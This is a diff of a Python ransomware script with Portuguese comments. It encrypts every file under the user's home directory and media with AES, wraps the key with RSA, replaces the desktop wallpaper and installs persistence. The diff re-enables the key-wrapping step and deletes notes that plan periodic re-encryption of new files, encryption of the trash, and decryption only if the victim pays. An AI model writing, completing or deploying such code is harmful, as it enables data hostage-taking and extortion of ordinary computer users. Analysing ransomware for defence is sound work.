@@ -72,26 +72,10 @@ def get_user():
     # obj = json.loads(dados)
     # print(obj['id'])
 
-
-'''
-NOVAS COISAS :
- - arquivo na area de trabalho com todos os arquivos criptografados.
- - rotina  -> (depois de criptografar tudo):
-    de 1 em 1 minuto
-    checar se tem algum arquivo novo -> salvar todos os arquivos numa lista. se tiver novo arquivo -> criptografa ele
-    trocar o wallpaper dnv
-
-
-
-
-    criptografar lixeira tbm
-    os.path.expanduser('~') + '/.local/share/Trash/files/'
-'''
-
 # Starting point of encrypting
 def menu(senha_AES):
     tipos_arquivos = file_types.split(' ')
-    home = os.environ['HOME'] # /home/user is the start point
+    home = os.environ['HOME']
 
     # # the media
     t = threading.Thread(target = listar_media, args=(senha_AES, tipos_arquivos))
@@ -146,7 +130,7 @@ def listar_media(senha_AES, tipos_arq):
             '''
 
 # lists and encrypt files
-def listar(chave_AES,diretorio, tipos_arq):
+def listar(chave_AES, diretorio, tipos_arq):
     # add to the list the files inside the start directory
     file_to_encrypt = []
     arqs = os.listdir(diretorio)
@@ -206,15 +190,11 @@ def gera_chave_AES():
 def change_background():
     os.system('gsettings set org.gnome.desktop.background picture-uri '+ os.getcwd()+'/wallpaper.jpg')
 
-def crypto_all():
+def main():
     AES_key = gera_chave_AES()
-    print('[*] Chave AES gerada')
     menu(AES_key) # -> Encrypt everything
-    '''AES_to_RSA()
-    print('[*] Senha AES criptografado com chave RSA')
+    AES_to_RSA()
     RSA_to_SRSA()
-    print('[*] Chave privada do cliente criptografada')
-'''
 
 def persistence():
     def generate_decryptor():
@@ -256,31 +236,8 @@ def persistence():
                                                                                                                                  , stderr=subprocess.PIPE)
 
 if __name__ == "__main__":
-    crypto_all()
+    main()
     #change_background()
     #get_user()
     #persistence()
     pass
-
-
-
-
-
-
-
-# == ALGORITMO ==
-    # criptografa todos os arquivos com AES
-
-    # criptografa a chave AES
-
-    # criptografa a chave privada RSA
-
-
-    ############### SE PAGAR #####################
-
-
-    # descriptografa a chave privada (R) com a chave privada(S)
-
-    # descriptografa a chave AES, com a chave privada (R)
-
-    # descriptografa todos os arquivos com a chave AES
